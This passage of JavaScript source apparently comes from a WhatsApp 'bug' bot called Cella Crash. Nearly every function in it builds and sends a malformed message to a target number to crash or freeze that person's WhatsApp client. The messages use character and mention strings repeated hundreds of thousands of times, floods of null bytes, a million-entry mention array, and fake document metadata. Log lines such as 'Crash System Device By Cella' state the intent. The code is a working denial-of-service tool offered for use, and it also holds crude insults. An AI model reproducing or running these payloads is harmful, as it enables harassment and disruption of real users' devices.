ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ҉          𖣂𓍯̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6282332790754".repeat(27000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}"
            },
            contextInfo: {
              mentionedJid: ["6282332790754@s.whatsapp.net"],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      }
    }, zLoc ? {
      participant: {
        jid: zLoc
      }
    } : {});
    console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
  }
async function freezefile(zLoc, ptcp = false) {
    let virtex = "🌸͜͞.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤🌿" + "@1".repeat(250000);
    await sych.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "🌿͜͞.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤🌸",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
} 
    
async function xPokers(zLoc, ptcp = false) {
    let virtex = ".⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤☠️" + "@6282291664759".repeat(25000);
    await sych.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "🦠.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤☠️",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "6282291664759@s.whatsapp.ney"),
                        groupMentions: [{ groupJid: "6282291664759@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
		
async function xTravas(zLoc, ptcp = false) {
    let virtex = "Cella";
    let buttons = Array.from({ length: 200 }, () => ({
        name: 'call_permission_request',
        buttonParamsJson: '{}'
    }));
    let overJids = Array.from({ length: 1039900 }, () => zLoc);
    
    await sych.relayMessage(zLoc, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xinn " }]
                    }
                }
            }
        },
        contextInfo: {
            mentionedJid: overJids,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `-> .⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤ `,
                body: `—??`,
                previewType: "VIDEO",
                thumbnail: "",
                sourceUrl: "https://byxzmods.com",
                mediaUrl: "https://byxzmods.com"
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}


async function Vulcanicx(zLoc, ptcp = false) {
    let virtex = "Cela " + "ꦾ".repeat(40000);
    await sych.relayMessage(zLoc, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: Array(20).fill({
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        })
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
        
        
async function NullX(zLoc, ptcp = false) {
    await sych.relayMessage(zLoc, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " Halo Bro ",
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: zLoc } } : {}
    );
};
async function bakdok(zLoc, ptcp = false) {
 var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `Cella DOCUMENT`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: zLoc, quoted: ptcp });
await sych.relayMessage(target, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id });
}
async function CallMsg(zLoc, ptcp = false) {
    await sych.relayMessage(zLoc, {
                        "messageContextInfo": {
                            "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                            "deviceListMetaData": {},
                            "deviceListMetadataVersion": 2
                        },
                        "scheduledCallCreationMessage": {
                            "scheduledTimestampMs": '1200',
                            callType: "AUDIO",
                            "title": ' # TrashDex - Explanation ' + '❗'.repeat(20000),
                        }
                    }, {
                        additionalAttributes: {
                            edit: '7'
                        }
                    })
                }


async function CaroUsel(zLoc, ptcp = false) {
      let etc = generateWAMessageFromContent(
        zLoc,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  locationMessage: {},
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑‌Cella Crash ‌",
                },
                nativeFlowMessage: {
                  name: "call_permission_request",
                  messageParamsJson: " ꦾ ",
                },
                carouselMessage: {},
              },
            },
          },
        }),
        {
          userJid: zLoc,
          quoted: m
        }
      );

      await sych.relayMessage(
        zLoc,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: zLoc,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
    }
    
		async function TanggapanDiterima(zLoc, ptcp = false) {
			await sych.relayMessage(zLoc, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "CellaNuLL",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc
					}
				} : {}
			);
			console.log(chalk.green("Cella Attacked Someone! 😴"));
		};
		
		
		
		
  async function uidoc(zLoc, ptcp = false) {
    let uitext = "𝘼𝙩𝙩𝙖𝙘𝙠 𝙐𝙞" + "𑲭𑲭".repeat(50000);
    await sych.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/pdf',
                            fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: "unidentifiedMessageType",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xin x9 " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}



    // Freeze Speciality //
     async function locasiV2(zLoc, ptcp = false) {
   let mark = '0@s.whatsapp.net';
    await sych.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Cella Bug" + "ꦾ".repeat(1099)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function locasifreeze(zLoc, ptcp = false) {
    await sych.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Cela" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}


async function langz(zLoc, ptcp = false) {
    try {
        // Membuat pesan dengan tombol di WhatsApp
        const xp = generateWAMessageFromContent(zLoc, {
            viewOnceMessage: {
                message: {
                    buttonsMessage: {
                        buttons: [
                            {
                                buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
                                buttonText: { displayText: "Kontol" },
                                type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
                            }
                        ],
                        contentText: "💀puki💀",
                        headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
                        text: "Dasar Kontol"
                    }
                }
            }
        }, { ephemeralExpiration: 5, timestamp: new Date() });

        // Mengirim pesan dengan tombol
        const x1 = await sych.relayMessage(zLoc, xp.message,  {
					participant: {
						jid: zLoc
					}
				});
        // Menyiapkan pesan respons tombol
        const od = await sych.relayMessage(zLoc, {
            viewOnceMessage: {
                message: {
                    buttonsResponseMessage: {
                        selectedButtonId: `${"\u0000".repeat(510000)}`, // Potensi crash uji coba
                        selectedDisplayText: "Kontol",
                        type: proto.Message.ButtonsResponseMessage.Type.DISPLAY_TEXT,
                        contextInfo: {
                            participant: zLoc,
                            remoteJid: zLoc,
                            stanzaId: x1,  // Menggunakan ID pesan sebelumnya
                            quotedMessage: {
                                viewOnceMessage: {
                                    message: {
                                        buttonsMessage: {
                                            buttons: [
                                                {
                                                    buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
                                                    buttonText: { displayText: "Kontol" },
                                                    type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
                                                }
                                            ],
                                            contentText: "💀puki💀",
                                            headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
                                            text: "Dasar Kontol"
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }, {
					participant: {
						jid: zLoc
					}
				});

        console.log(od);

        // Mengirim balasan jika perintah valid
        await sych.sendMessage(zLoc, { text: "Dasar Kontol" }, { quoted: m });

    } catch (error) {
        console.error("Terjadi kesalahan:", error);
    }
}



async function documentfreeze(zLoc, ptcp = false) {

let profile;
try {
    profile = await sych.profilePictureUrl(m.sender, 'image');
} catch (e) {
    profile = fake.anonim;
}
    
    await sych.sendMessage(zLoc, {
    document: fake.docs,
    fileName: ucapanWaktu,
    mimetype: pickRandom(fake.listfakedocs),
    fileLength: '100000000000000',
    pageCount: '999',
    image: {
        url: "./src/media/sych.png", // Pastikan file ini tersedia
        gifPlayback: true
    },
    caption: `╭──❍ *BOT MENU* ❍──╮
├ 📌 *${ucapanWaktu}*
├ 🤖 *Bot Status:* 🟢 Active
├ 👤 *Owner:* Galangz
├ 🌐 *Website:* https://mataberita.com
├ 📅 *Tanggal:* ${new Date().toLocaleDateString()}
╰──❍ *Powered by Galangz* ❍──╯

📍 *Gunakan tombol di bawah ini untuk memilih menu!*`,
    
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
            title: "Bot Status",
            body: "🟢 Active",
            thumbnailUrl: profile,
            mediaType: 1,
            renderLargerThumbnail: true,
            previewType: 0,
            mediaUrl: my.gh,
            sourceUrl: my.gh
        }
    },
    
    footer: "© Langz",
    
    buttons: [
        { buttonId: ".bot mode self", buttonText: { displayText: "🤖 Self Mode" }, type: 1 },
        { buttonId: ".bot mode public", buttonText: { displayText: "🌍 Public Mode" }, type: 1 },
        {
            buttonId: 'action',
            buttonText: { displayText: '📋 Pilih Menu' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "📌 Menu Utama",
                    sections: [
                        {
                            title: "🔰 *Main Menu*",
                            highlight_label: "Powered by Galangz",
                            rows: [
                                { title: "📜 All Commands", description: "Daftar Semua Perintah Bot", id: ".allmenu" },
                                { title: "👤 Owner", description: "Info Pemilik Bot", id: ".owner" },
                                { title: "🎁 Donasi", description: "Bantu Kami dengan Donasi", id: ".donasi" },
                                { title: "⚙️ Bot Settings", description: "Pengaturan Bot", id: ".botsettings" }
                            ]
                        },
                        {
                            title: "🌟 *Fitur Bot*",
                            rows: [
                                { title: "📂 Downloader", description: "Unduh Video, Musik, dan Lainnya", id: ".downloadmenu" },
                                { title: "🛠 Tools", description: "Kumpulan Alat Berguna", id: ".toolsmenu" },
                                { title: "🖼 Sticker", description: "Buat dan Unduh Sticker", id: ".stickermenu" },
                                { title: "🎮 Game", description: "Mainkan Game Seru!", id: ".gamemenu" }
                            ]
                        },
                        {
                            title: "📢 *Grup & Sosial*",
                            rows: [
                                { title: "👥 Grup Menu", description: "Fitur Khusus Grup", id: ".groupmenu" },
                                { title: "💬 Chat AI", description: "Ngobrol dengan AI", id: ".chatmenu" }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ],
    
    viewOnce: true,
    headerType: 4
}, { remoteJid: zLoc }, { messageId: null });
}

async function documentfreeze2(zLoc, ptcp = false) {
    let uitext = "Cella" +  "꧀ *~@1~*".repeat(50000);
    await sych.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                            fileSha256: "7SXMgNYBO4tkPSk3W46FQ3hUcK6K6G3//TiB5/ibhwg=",
                            fileLength: "829710112",
                            pageCount: 0x9184e729fff,
                            mediaKey: "/gaasVF/Lt68CK4sy5DTRhJDQls+RwNDwU6yhGZjPCk=",
                            fileName: "@cella💸",
                            fileEncSha256: "nRvyfj/ky0+6upJrQMnwtuXm6lye2RuavfYM+cVl0hU=",
                            directPath: "v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732537847",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}


    async function Gsz(zLoc, ptcp = false) {
      await sych.relayMessage(
        zLoc,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  locationMessage: {},
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⚝CellaForyou⚝" + "\u0000".repeat(900000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "",
                },
                carouselMessage: {},
              },
            },
          },
        },
        {
          participant: {
            jid: zLoc,
          },
        }
      );
      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
    }
    
async function uidoc2(zLoc, ptcp = false) {
    let akumw = "~Crash~" + "ꦿꦾ".repeat(50000);
    await sych.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " .⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤ ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Credits to xin bro " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}



async function liveLokFreeze(zLoc, ptcp = false) {
        let xcl = "ꪶ𖣂ꫂ xCella 厷"+"𑲭𑲭".repeat(77777) + "@1".repeat(77777);
var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": xcl,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     },
     body: {
     text: "virtex"
     },
     nativeFlowMessage: {},
     contextInfo: {
     mentionedJid: ["6285805338638@s.whatsapp.net"],
     groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: xcl }]
     }
  }
}
}), { userJid: zLoc, quoted: m })
await sych.relayMessage(zLoc, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id })
console.log(chalk.red.bold('Crash System Device By Cella'))
}

// Ios Speciality //
	async function IosPayM(zLoc, ptcp = false) {
			sych.relayMessage(zLoc, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			});
			console.log(chalk.green("Cella Bot | Bug Sent "));
		};
		
				async function IosStanza(zLoc, ptcp = false) {
			sych.relayMessage(zLoc, {
				'extendedTextMessage': {
					'text': 'CellaBugs' + 'ꦾ'.repeat(35000),
					'contextInfo': {
						'stanzaId': zLoc,
						'participant': zLoc,
						'quotedMessage': {
							'conversation': '🌷 Cella Here' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("Attacking | Bug Sent 😈"));
		};
		
				async function IosCL(zLoc, ptcp = false) {
			await sych.relayMessage(zLoc, {
					"extendedTextMessage": {
						"text": " Hello This Is cella ",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
